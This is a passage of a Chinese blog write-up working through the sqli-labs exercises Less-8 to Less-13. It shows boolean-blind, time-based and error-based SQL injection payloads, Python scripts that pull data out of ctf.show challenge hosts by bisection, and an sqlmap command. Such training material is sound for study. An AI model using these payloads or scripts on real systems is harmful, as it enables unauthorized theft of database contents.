class="string">' and ((select ascii(substr(database(),1,1)))&gt;114) and 1=1 --+ //true </span></span><br><span class="line"><span class="string">Less-8/?id=1'</span> <span class="keyword">and</span> ((<span class="keyword">select</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">&gt;</span><span class="number">116</span>) <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--+ //false</span></span><br></pre></td></tr></tbody></table></figure>

<p>根据不断的变换范围，最后得到了第一个字母的ascii码大于113但是不大于115，因此，它的ascii码就是114，对照ASCII码表，得到第一个字母为‘s’。</p>
<p>同样的方法，我们可以变化<code>substr()</code>里面的第二个参数分别为2,3,4,5,6,7，最后可以获得接下来的其他七个字母，最终得到数据库名称“security”。</p>
<p>通过这个方法，我们可以首先通过<code>information_schema</code>库中的<code>tables</code>表查看我们注入出的数据库下的所有的表的数量，按照<code>limit</code>的方法选取某个表，通过<code>length</code>得到它的名字的长度，就可以得到它的完整表名。同理，通过<code>columns</code>表获得某个表下的所有字段数量，并且获得每个字段的名称长度和具体名称，查出指定表下的记录数量，根据字段去获取某条记录的某个字段值的长度，就能获得该值的内容。</p>
<h5 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h5><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://43d7c6c4-a8ab-41f3-8e14-fc32c023ca20.challenge.ctf.show/"</span></span><br><span class="line">payload = {</span><br><span class="line">	<span class="string">"uname"</span> : <span class="string">""</span>,</span><br><span class="line">	<span class="string">"passwd"</span> : <span class="string">"123456"</span>,</span><br><span class="line">	<span class="string">"submit"</span> : <span class="string">"Submit"</span></span><br><span class="line">}</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">	l = <span class="number">33</span></span><br><span class="line">	r =<span class="number">130</span></span><br><span class="line">	mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">	<span class="keyword">while</span>(l&lt;r):</span><br><span class="line">		<span class="comment"># 跑库名</span></span><br><span class="line">		<span class="comment">#"-1\" or 0^" + "(ascii(substr((SeleCt/**/grOUp_conCAt(schema_name)/**/fROm/**/information_schema.schemata),{0},1))&gt;{1})-- ".format(i, mid)</span></span><br><span class="line"></span><br><span class="line">		<span class="comment"># 跑表名</span></span><br><span class="line">		<span class="comment">#"-1\" or 0^" + "(ascii(substr((SeleCt/**/grOUp_conCAt(table_name)/**/fROm/**/information_schema.tables/**/wHERe/**/table_schema/**/like/**/'ctfshow'),{0},1))&gt;{1})-- ".format(i, mid)</span></span><br><span class="line"></span><br><span class="line">		<span class="comment"># 跑列名</span></span><br><span class="line">		<span class="comment">#"-1\" or 0^" + "(ascii(substr((Select/**/groUp_coNcat(column_name)frOm/**/information_schema.columns/**/Where/**/table_name/**/like/**/'flagb'),{0},1))&gt;{1})-- ".format(i,mid)</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">#######################</span></span><br><span class="line">		<span class="comment">#"-1\" or 0^" + "(ascii(substr((select(flag4s)from(ctfshow.flagb)),{0},1))&gt;{1})-- ".format(i, mid)</span></span><br><span class="line"></span><br><span class="line">		payload[<span class="string">"uname"</span>] =<span class="string">"-1\" or 0^"</span> + <span class="string">"(ascii(substr((select(flag4s)from(ctfshow.flagb)),{0},1))&gt;{1})-- "</span>.<span class="built_in">format</span>(i, mid)</span><br><span class="line"></span><br><span class="line">		html = requests.post(url,data=payload)</span><br><span class="line">		<span class="built_in">print</span>(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"/images/flag.jpg"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">			l = mid+<span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			r = mid</span><br><span class="line">		mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">chr</span>(mid)==<span class="string">" "</span>):</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	result = result + <span class="built_in">chr</span>(mid)</span><br><span class="line">	<span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"flag: "</span> ,result)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>



<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  <span class="comment"># 导入 requests 模块用于发送 HTTP 请求</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"xxx/Less-5/?id=1' and "</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 布尔盲注函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sqlbool</span>(<span class="params">url</span>):</span><br><span class="line">  result = <span class="string">""</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):  <span class="comment"># 对于表名中的每个字符进行迭代</span></span><br><span class="line">    min_value = <span class="number">33</span></span><br><span class="line">    max_value = <span class="number">130</span></span><br><span class="line">    mid = (min_value + max_value) // <span class="number">2</span>  <span class="comment"># 中值</span></span><br><span class="line">    <span class="keyword">while</span> (min_value &lt; max_value):</span><br><span class="line">        <span class="comment"># 构造 SQL 查询</span></span><br><span class="line">      newurl = url + <span class="string">f"ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class="subst">{i}</span>,1))&gt;<span class="subst">{mid}</span>--+"</span></span><br><span class="line">      r = requests.get(newurl)  <span class="comment"># 发送请求</span></span><br><span class="line">      <span class="keyword">if</span> <span class="string">"You are in........."</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        min_value = mid + <span class="number">1</span>  <span class="comment"># 更新搜索范围</span></span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        max_value = mid</span><br><span class="line">      mid = (min_value + max_value) // <span class="number">2</span>  <span class="comment"># 更新中值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">chr</span>(mid) == <span class="string">" "</span>):   <span class="comment"># 如果中值是空格，表示表名结束</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    result += <span class="built_in">chr</span>(mid)  <span class="comment"># 将字符添加到结果中</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line">sqlbool(url)  <span class="comment"># 调用</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="Less-9-Time-Based-single-quotes"><a href="#Less-9-Time-Based-single-quotes" class="headerlink" title="Less-9 Time Based-single quotes"></a>Less-9 <em>Time Based-single quotes</em></h3><p>在Less-9可以看到，无论尝试闭合或查询，服务器都会返回success，我们无法直接从服务器注入出任何信息。</p>
<p>通过前文可知，有回显的情况可以用union关键字直接带出数据；服务器只能给出“是”或“否的情况下，可以使用布尔盲注获得数据。</p>
<p>如果服务器完全没有输出该如何进行注入呢?</p>
<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>基于时间的注入（延时注入）(Time-based blind SQl injection)</p>
<ul>
<li><p>利用前提：页面没有显示位，也没有输入SQL语句执行错误信息，正确的SQL语句和错误的返回页面都一样，但是加入sleep（5）条件后，正确的SQL语句页面返回速度明显慢了5秒，错误的SQL语句立即返回。</p>
</li>
<li><p>优点：不需要显示位，不需要报错信息。</p>
</li>
<li><p>缺点：速度慢，耗费大量时间</p>
</li>
<li><p>用法：IF(Condition，A，B)函数，当Condition为TRUE时，返回A；否则返回B。</p>
</li>
<li><p>示例：</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> IF(ASCII(SUBSTR(<span class="keyword">USER</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">65</span> ,SLEEP(<span class="number">5</span>),<span class="number">1</span>);  </span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<p>我们可以利用mysql内置的延时函数<code>sleep</code>人为地制造出差异。</p>
<h5 id="手工注入-1"><a href="#手工注入-1" class="headerlink" title="手工注入"></a>手工注入</h5><p>根据输入来延时请求数据，观察请求时间是否存在延长，如果存在就是存在时间盲注，这里会使用if和sleep函数来进行判断。</p>
<p>if的语法三元运算符函数</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法：IF(<span class="keyword">CONDITION</span>, value_if_true, value_if_false)</span><br></pre></td></tr></tbody></table></figure>

<p><code>CONDITION</code>是一个条件表达式，如果条件成立，则返回<code>value_if_true</code>，否则返回<code>value_if_false</code>。利用这一点来进行时间盲注。</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-9</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">' and if(length(database())=1,sleep(5),1)--+ //延时</span></span><br><span class="line"><span class="string">Less-9/?id=1'</span> <span class="keyword">and</span> if(length(database())<span class="operator">=</span><span class="number">10</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">--+ //正常</span></span><br><span class="line">Less<span class="number">-9</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">' and if(length(database())=7,sleep(5),1)--+  //延时</span></span><br><span class="line"><span class="string">Less-9/?id=1'</span> <span class="keyword">and</span> if(length(database())<span class="operator">=</span><span class="number">8</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">--+ //正常</span></span><br></pre></td></tr></tbody></table></figure>



<h5 id="python脚本-1"><a href="#python脚本-1" class="headerlink" title="python脚本"></a>python脚本</h5><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">s = requests.session()          <span class="comment">#创建session对象后，才可以调用对应的方法发送请求。</span></span><br><span class="line">url = <span class="string">'http://fff9f4b8-f0ad-4c2a-b499-2ee73acc6720.challenge.ctf.show/?id='</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="comment"># 查询数据库：payload = f'1\'%0cand%0cif((ascii(substr(database(),{i},1))&gt;{mid}),1,sleep(3))--+'</span></span><br><span class="line">        <span class="comment"># 查询数据库：payload = f'1\'%0cand%0cif((ascii(substr((select group_concat(schema_name)from information_schema.schemata),{i},1))&gt;{mid}),1,sleep(3))--+'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 查询数据表：payload = f'1\'%0cand%0cif(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=\'ctfshow\')),{i},1))&gt;{mid},1,sleep(3))--+'</span></span><br><span class="line">        <span class="comment"># 查询表字段：payload = f'1\'%0cand%0cif(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name="flagug")),{i},1))&gt;{mid},1,sleep(3))--+'</span></span><br><span class="line">        <span class="comment"># 查询字段中信息：payload = f'1\'%0cand%0cif(ascii(substr((select(flag4a23)from(ctfshow.flagug)),{i},1))&gt;{mid},1,sleep(3))--+'</span></span><br><span class="line">        payload = <span class="string">f'1\'%0cand%0cif(ascii(substr((select(flag4a23)from(ctfshow.flagug)),<span class="subst">{i}</span>,1))&gt;<span class="subst">{mid}</span>,1,sleep(3))--+'</span></span><br><span class="line"></span><br><span class="line">        stime = time.time()</span><br><span class="line">        url1 = url + payload</span><br><span class="line">        r = s.get(url=url1)</span><br><span class="line">        r.encoding = <span class="string">"utf-8"</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> time.time() - stime &lt; <span class="number">2</span>:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(low)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>与布尔盲注脚本合并，如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time  <span class="comment"># 导入时间模块</span></span><br><span class="line"><span class="keyword">import</span> requests  <span class="comment"># 导入 requests 模块用于发送 HTTP 请求</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"xxx/Less-5/?id=1' and "</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 布尔盲注函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sqlbool</span>(<span class="params">url</span>):</span><br><span class="line">  result = <span class="string">""</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):  <span class="comment"># 对于表名中的每个字符进行迭代</span></span><br><span class="line">    min_value = <span class="number">33</span></span><br><span class="line">    max_value = <span class="number">130</span></span><br><span class="line">    mid = (min_value + max_value) // <span class="number">2</span>  <span class="comment"># 中值</span></span><br><span class="line">    <span class="keyword">while</span> (min_value &lt; max_value):</span><br><span class="line">        <span class="comment"># 构造 SQL 查询</span></span><br><span class="line">      newurl = url + <span class="string">f"ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class="subst">{i}</span>,1))&gt;<span class="subst">{mid}</span>--+"</span></span><br><span class="line">      r = requests.get(newurl)  <span class="comment"># 发送请求</span></span><br><span class="line">      <span class="keyword">if</span> <span class="string">"You are in........."</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        min_value = mid + <span class="number">1</span>  <span class="comment"># 更新搜索范围</span></span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        max_value = mid</span><br><span class="line">      mid = (min_value + max_value) // <span class="number">2</span>  <span class="comment"># 更新中值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">chr</span>(mid) == <span class="string">" "</span>):   <span class="comment"># 如果中值是空格，表示表名结束</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    result += <span class="built_in">chr</span>(mid)  <span class="comment"># 将字符添加到结果中</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 时间盲注函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sqlsleep</span>(<span class="params">url</span>):</span><br><span class="line">  result = <span class="string">""</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    min_value = <span class="number">33</span></span><br><span class="line">    max_value = <span class="number">130</span></span><br><span class="line">    mid = (min_value + max_value) // <span class="number">2</span>  <span class="comment"># 中值</span></span><br><span class="line">    <span class="keyword">while</span> (min_value &lt; max_value):</span><br><span class="line">      start = time.time()   <span class="comment"># 记录开始时间</span></span><br><span class="line">      newurl = url + <span class="string">f"if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class="subst">{i}</span>,1))&gt;<span class="subst">{mid}</span>,sleep(3),1)--+"</span></span><br><span class="line">      r = requests.get(newurl)</span><br><span class="line">      <span class="built_in">print</span>(newurl)</span><br><span class="line">      end = time.time()  <span class="comment"># 记录结束时间</span></span><br><span class="line">      <span class="keyword">if</span> end - start &gt; <span class="number">3</span>:</span><br><span class="line">        min_value = mid + <span class="number">1</span></span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        max_value = mid</span><br><span class="line">      mid = (min_value + max_value) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">chr</span>(mid) == <span class="string">" "</span>):</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    result += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line">sqlbool(url)  <span class="comment"># 调用</span></span><br><span class="line">sqlsleep(url)  <span class="comment"># 调用</span></span><br></pre></td></tr></tbody></table></figure>



<h5 id="使用sqlmap"><a href="#使用sqlmap" class="headerlink" title="使用sqlmap"></a>使用sqlmap</h5><p>直接将url输入到sqlmap中。</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u sqlmap <span class="operator">-</span>u  http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="Less-10-Time-Based-double-quotes"><a href="#Less-10-Time-Based-double-quotes" class="headerlink" title="Less-10 Time Based-double quotes"></a>Less-10 <em>Time Based-double quotes</em></h3><p>闭合方式为<code>"</code>，其余与Less-9相同。</p>
<h1 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h1><h2 id="Error-Based"><a href="#Error-Based" class="headerlink" title="Error Based"></a>Error Based</h2><h3 id="Less-11-single-quotes"><a href="#Less-11-single-quotes" class="headerlink" title="Less-11 single quotes"></a>Less-11 <em>single quotes</em></h3><p>数据的提交方式从GET变成了POST，但是既然是SQL注入，那么在username/password中一定存在可以注入的点。尝试闭合一下看是否会报错：</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username:<span class="number">1</span><span class="string">'</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711212402864.png" alt="image-20240711212402864"></p>
<p>可以看到页面报错，说明存在SQL注入。</p>
<p>POST方式提交不能直接修改，有三种方式</p>
<p>1、使用可以POST提交的插件，例如Firefox中的HackBar</p>
<p>2、<strong>使用Burpsuite抓包后修改</strong></p>
<p>3、直接在输入框中注入</p>
<p>源码：</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">'$uname'</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">'$passwd'</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p>bp抓包进入<code>repeater</code>，在<code>request</code>模块中可以看出我们输入的用户名和密码分别属于第一列和第2列。</p>
<p>闭合是单引号<code>'</code>。位数是<code>2</code>.</p>
<p>爆库： <code>ctftraining</code></p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>xxx<span class="string">' and 1=2 union select 1,group_concat(schema_name) from information_schema.schemata--+&amp;passwd=123456&amp;submit=Submit</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712223210351.png" alt="image-20240712223210351"></p>
<p>爆表：<code>flag</code></p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>xxx<span class="string">' and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema='</span>ctftraining<span class="string">'--+&amp;passwd=123456&amp;submit=Submit</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/HolyBeagle/AppData/Roaming/Typora/typora-user-images/image-20240712223348868.png" alt="image-20240712223348868"></p>
<p>爆列：<code>flag</code></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=xxx' and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'--+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712223457352.png" alt="image-20240712223457352"></p>
<p>获取字段值（flag）：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=xxx' and 1=2 union select 1,group_concat(flag) from ctftraining.flag--+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712223723393.png" alt="image-20240712223723393"></p>
<p>flag{db3db0cf-f2d7-4506-8658-88062c6e44cd}</p>
<h3 id="Less-12-double-quotes-with-twist"><a href="#Less-12-double-quotes-with-twist" class="headerlink" title="Less-12 double quotes with twist"></a>Less-12 <em>double quotes with twist</em></h3><p>闭合的方式变成了<code>")</code>，其余不变。</p>
<h3 id="Less-13-Double-Injection-single-quotes"><a href="#Less-13-Double-Injection-single-quotes" class="headerlink" title="Less-13 Double Injection-single quotes"></a>Less-13 <em>Double Injection-single quotes</em></h3><p>闭合方式<code>')</code>。但是使用12关的payload来尝试注入时，页面只会回复一个登录成功，并没有得到想要的数据。</p>
<p>使用<strong>报错注入</strong>有效爆出表名、列名、数据：</p>
<p>payload</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123</span><span class="string">') union select updatexml(1,concat(0x7e,(select database()),0x7e),1) #</span></span><br></pre></td></tr></tbody></table></figure>

<p>爆库： ctftraining</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">') union select 1,(extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata))))--+&amp;passwd=123456&amp;submit=Submit</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712224423481.png" alt="image-20240712224423481"></p>
<p>爆表：flag</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">') union select 1,(extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='</span>ctftraining<span class="string">'))))--+&amp;passwd=123456&amp;submit=Submit</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712224504340.png" alt="image-20240712224504340"></p>
<p>爆列：flag</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">') union select 1,(extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='</span>ctftraining<span class="string">' and table_name='</span>flag<span class="string">'))))--+&amp;passwd=123456&amp;submit=Submit</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712224548415.png" alt="image-20240712224548415"></p>
<p>获取字段（flag）：</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">') union select 1,(extractvalue(1,concat(0x7e,(select group_concat(flag) from ctftraining.flag)))) --+&amp;passwd=123456&amp;submit=Submit</span></span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">') union select 1,(extractvalue(1,concat(0x7e,(select reverse(group_concat(flag)) from ctftraining.flag)))) --+&amp;passwd=123456&amp;submit=Submit</span></span><br><span class="line"><span class="string">//倒读</span></span><br></pre></td></tr></tbody></table></figure>

